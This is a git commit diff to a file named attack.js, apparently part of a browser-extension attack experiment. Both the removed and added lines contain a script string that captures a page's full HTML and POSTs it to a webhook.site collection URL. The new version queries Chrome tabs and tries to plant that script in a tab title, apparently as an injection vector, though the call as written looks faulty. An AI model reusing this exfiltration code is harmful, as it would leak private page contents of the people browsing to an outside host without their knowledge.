e5ab47e798d0121e1325f440bfbc7eb91315651d
JBA192 <62188601+JBA192@users.noreply.github.com>
2023-03-15 16:00:08 -0400

    Updated extension attack

--- attack.js
+++ attack.js
@@ -1,4 +1,4 @@
-let tab = window;
-var attackScript = "var html = document.documentElement.outerHTML; var server = new XMLHttpRequest;server.open('POST', 'https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c/html=' + encodeUROComponent(html));server.send();"
-tab.document.title = attackScript;
-console.log(tab.document.title);
+chrome.tabs.query({}, function (tabs) {
+    let attackScript = "var html = document.documentElement.outerHTML; var server = new XMLHttpRequest;server.open('POST', 'https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c/html=' + encodeURIComponent(html));server.send();"
+    chrome.tabs.update(tabs[0], { title: attackScript });
+});
